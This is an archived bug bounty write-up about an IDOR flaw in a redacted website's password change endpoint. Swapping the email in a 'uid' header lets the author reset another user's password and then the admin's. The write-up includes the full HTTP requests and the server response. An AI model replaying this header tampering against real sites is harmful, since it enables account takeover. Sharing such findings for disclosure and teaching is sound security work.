# IDOR leading to Privilege Escalation!

- **Source URL:** https://k4pil.medium.com/idor-leading-to-privilege-escalation-c45f4a6380a1?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20260711112712/https://k4pil.medium.com/idor-leading-to-privilege-escalation-c45f4a6380a1?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/2769 (id 2769)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# **IDOR leading to Privilege Escalation!**

Hi folks, I am [Kapil Varma](https://web.archive.org/web/20260711112712/https://k4pil.github.io/), a cybersecurity enthusiast and security researcher from India!

This is my 2nd writeup on IDOR vulnerability…suggestions and appreciation is welcomed…hope this article will be helpful and y’all would like it!

Let’s head to the write-up now!

**What exactly IDOR is?**

In a web application, whenever a user generates, sends, or receives a request from a server, there are some HTTP parameters such as “id”, “uid”, “pid” etc that have some unique values which the user has been assigned. An attacker can see such parameter values in cookies, headers, or wifi Packet captures. Via this, an attacker might be able to tamper with these values and this tampering may lead to IDOR(Insecure Direct Object Reference) vulnerability which may result in access to data the tampered values refer to.

**How I found IDOR?!**

So recently I was exploring a website…I registered an account on it and logged myself in :)

And here the bug boi wakes up!!

I quickly went to the password reset section of my account and fired up Burpsuite!

So, I saw only one input field on password reset page at first..which was simply asking for current password for verification, so I entered my current password and went further..

**Here comes the scenario!**

I saw the page now came up with two input fields, one for new password and another for confirmation of new password!

So what? I opened my Burpsuite. After entering a new password in both input fields, I captured the request for setting up the new password into Burp!

```
POST /login/changepassword HTTP/1.1
Host: redacted.com
Connection: close
Content-Length: 119
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, */*
uid: attacker@gmail.com
device: Web
sec-ch-ua-platform: "Windows"
Origin: https://www.redacted.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.redacted.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
{"uid":null,"password":"newpassword","confirmpassword":"newpassword","dns":"www.redacted.com"}
```
Looking at the above request, the parameters were not so interesting to me, also I check them for other bugs but no success :(

Anyways I saw a header named “uid” which had my current email in the above request! I decided to check it for once…

**What I did ?**

I simply created another account on the portal using another mail acting as a victim…and replaced my email inside the “uid” header with this victim mail and forwarded the request…

```
POST /login/changepassword HTTP/1.1
Host: redacted.com
Connection: close
Content-Length: 119
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, */*
uid: victim@gmail.com
device: Web
sec-ch-ua-platform: "Windows"
Origin: https://www.redacted.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.redacted.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
{"uid":null,"password":"newpassword","confirmpassword":"newpassword","dns":"www.redacted.com"}
```
**Voila!! We just changed the victim’s password!!**

```
HTTP/1.1 200 
Date: Sat, 20 May 2023 18:55:52 GMT
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Connection: close
Server: nginx/1.18.0
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
{"msg":"200","uid":"victim@gmail.com","flag":"YES"}
```
BREATHE!!

This was now leading to horizontal privilege escalation…had enough time so decided to explore the web application a little more…

So I performed a subdomain enumeration on the domain…

Out of the results, one subdomain called “admin.redacted.com” took my attention!

WHAT I DID HERE??

I again replaced the “uid” header from the above request with the usual admin mail as “admin@redacted.com” and forwarded the request…

```
POST /login/changepassword HTTP/1.1
Host: redacted.com
Connection: close
Content-Length: 119
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, */*
uid: admin@redacted.com
device: Web
sec-ch-ua-platform: "Windows"
Origin: https://www.redacted.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.redacted.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
{"uid":null,"password":"newpassword","confirmpassword":"newpassword","dns":"www.redacted.com"}
```
Ahah!!

The same response was received…It seems that admin password is changed now!

So, I just visited “admin.redacted.com” and entered the admin mail with our newly changed password…

**Boom! We got inside!!!**

Hope you guys find this write-up helpful! Feel free to drop down your views, doubts, and suggestions!

I’ll be coming up with new write-ups in future, so stay tuned ;)

#Support me on: 1) [Twitter](https://web.archive.org/web/20260711112712/https://twitter.com/bolnanahiaata) 2) [Instagram](https://web.archive.org/web/20260711112712/https://www.instagram.com/k4pil.py/) 3) [LinkedIn](https://web.archive.org/web/20260711112712/https://linkedin.com/in/kapilvarmapsy/)

*#Buy me a coffee: Link*
